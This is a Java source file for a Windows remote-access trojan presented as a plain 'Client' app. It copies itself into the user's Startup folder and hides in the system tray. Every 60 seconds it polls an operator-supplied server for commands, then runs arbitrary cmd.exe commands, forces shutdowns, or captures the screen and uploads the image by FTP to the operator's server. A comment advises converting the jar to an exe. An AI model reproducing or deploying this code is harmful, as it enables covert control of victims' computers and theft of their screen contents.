package com.app;

import javax.imageio.ImageIO;

import javax.swing.*;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.*;
import java.awt.event.WindowEvent;
import java.awt.event.WindowStateListener;
import java.awt.image.BufferedImage;
import java.io.*;

import java.net.URL;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;


import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;


import javax.swing.JFrame;



public class Client {
    private JPanel Jpanel;
    private JPanel insideP;

    private JButton clickHereButton;

    private static final SimpleDateFormat sdf = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss");

    static Timestamp timestamp = new Timestamp(System.currentTimeMillis());

	//FTP SERVER LOGIN
	//Screenshot will be uploaded to this ftp
	
    static String server = ""; //FTP Address
    static int port = 21;
    static String user = ""; //FTP ID
    static String pass = ""; //FTP Password

    static FTPClient ftpClient = new FTPClient();

    Client() {


     }

    public static void main(String[] args) throws Exception{
        TrayIcon trayIcon;
        SystemTray tray=SystemTray.getSystemTray();
        JFrame frame=new JFrame("Client");
        frame.setContentPane(new Client().Jpanel);



        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        frame.setResizable(false);
        frame.pack();
        frame.setLocationRelativeTo(null);

        Path p=Paths.get("ClientApp.jar"); //You can convert jar to exe using launch4J http://launch4j.sourceforge.net/

        String currentUsersHomeDir = System.getProperty("user.home");
        String otherFolder = currentUsersHomeDir + File.separator + "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        Path d=Paths.get(otherFolder+ File.separator +"ClientApp.jar");
       if(Files.exists(p)&!Files.exists(d)){

           System.out.print("Exist File");
           Files.copy(p,d);

        }


            tray=SystemTray.getSystemTray();


        Image image= null;
        try {
            image = ImageIO.read(Client.class.getResource("/res/icon.png"));
        } catch (IOException e) {
            e.printStackTrace();
        }
        ActionListener exitListener=new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    System.out.println("Exiting....");
                    System.exit(0);
                }
            };
            PopupMenu popup=new PopupMenu();
            MenuItem defaultItem=new MenuItem("Exit");
            defaultItem.addActionListener(exitListener);
            popup.add(defaultItem);
            defaultItem=new MenuItem("Open");
            defaultItem.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                   frame.setVisible(true);
                    frame.setExtendedState(JFrame.NORMAL);
                }
            });
            popup.add(defaultItem);
            trayIcon=new TrayIcon(image, "Client Is Running!", popup);
            trayIcon.setImageAutoSize(true);

        frame.setIconImage(image);

        SystemTray finalTray = tray;
        frame.addWindowStateListener(new WindowStateListener() {
            public void windowStateChanged(WindowEvent e) {
                if(e.getNewState()==frame.ICONIFIED){
                    try {
                        finalTray.add(trayIcon);
                        frame.setVisible(false);
                        System.out.println("added to SystemTray");
                    } catch (AWTException ex) {
                        System.out.println("unable to add to tray");
                    }
                }
                if(e.getNewState()==7){
                    try{
                        finalTray.add(trayIcon);
                        frame.setVisible(false);
                        System.out.println("added to SystemTray");
                    }catch(AWTException ex){
                        System.out.println("unable to add to system tray");
                    }
                }
                if(e.getNewState()==frame.MAXIMIZED_BOTH){
                    finalTray.remove(trayIcon);
                    frame.setVisible(true);
                    System.out.println("Tray icon removed");
                }
                if(e.getNewState()==frame.NORMAL){
                    finalTray.remove(trayIcon);
                    frame.setVisible(true);
                    System.out.println("Tray icon removed");
                }
            }
        });

 frame.setVisible(false);
        try {
            tray.add(trayIcon);
        } catch (AWTException e) {
            e.printStackTrace();
        }



       Runnable helloRunnable = new Runnable() {
            public void run() {
                String out=repeat();

                if(out.contains("shutdown")){

                    try {

                        ShutDown(out.substring(out.lastIndexOf("shutdown")+8,out.indexOf("cmd1")));

                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
               if (out.contains("screenshot")){
                    try {
                        takeSS();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                if (out.contains("execute")){
                    try {
                        exe(out.substring(out.lastIndexOf("execute")+7,out.indexOf("cmd50")));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        };

        ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
        executor.scheduleAtFixedRate(helloRunnable, 0, 60, TimeUnit.SECONDS);



    }





        static String repeat() {


            URL link = null;
            BufferedReader in=null;
            String inputLine="";
            String res="";
            try {

                link = new URL("http://YOUR SERVER/index.php?time="+sdf.format(timestamp));  //sends current time
                in = new BufferedReader(
                        new InputStreamReader(link.openStream()));

                while ((inputLine = in.readLine()) != null){

                    System.out.println(inputLine);
                res=res+inputLine;
                }
                in.close();
            } catch (Exception e) {
                e.printStackTrace();
            }

                return res;

        }

static void ShutDown(String time) throws IOException{

    Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"shutdown /s /f /t "+time+ "&& exit\"");
}
static void takeSS() throws Exception{

    String fileName="";
    try {
        /*
         * Let the program wait for 2 seconds to allow you to open the
         * window whose screenshot has to be captured
         */
        Thread.sleep(2000);
        Robot robot = new Robot();
       fileName = sdf.format(timestamp)+".jpg";

        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit()
                .getScreenSize());
        BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
        ImageIO.write(screenFullImage, "jpg", new File(fileName));


    } catch (AWTException | IOException | InterruptedException ex) {
        System.err.println(ex);
    }
    upl(fileName);  //Upload the SS

    }

static void upl(String name) throws Exception{

    ftpClient.connect(server, port);
    ftpClient.login(user, pass);
    ftpClient.enterLocalPassiveMode();
    ftpClient.setFileType(FTP.BINARY_FILE_TYPE);

    // APPROACH #1: uploads first file using an InputStream
    File firstLocalFile = new File(name);

    String firstRemoteFile = "public_html/ss/"+name;  
    InputStream inputStream = new FileInputStream(firstLocalFile);

    System.out.println("Start uploading first file");
    boolean done = ftpClient.storeFile(firstRemoteFile, inputStream);
    inputStream.close();


    if (done) {
        System.out.println("The first file is uploaded successfully.");

        Path p = Paths.get(name);;
        Files.delete(p);

    }



}

    static void exe(String cmd) throws IOException{

        Runtime.getRuntime().exec("cmd /c start cmd.exe /K \""+cmd+ "&& exit\"");
    }


}
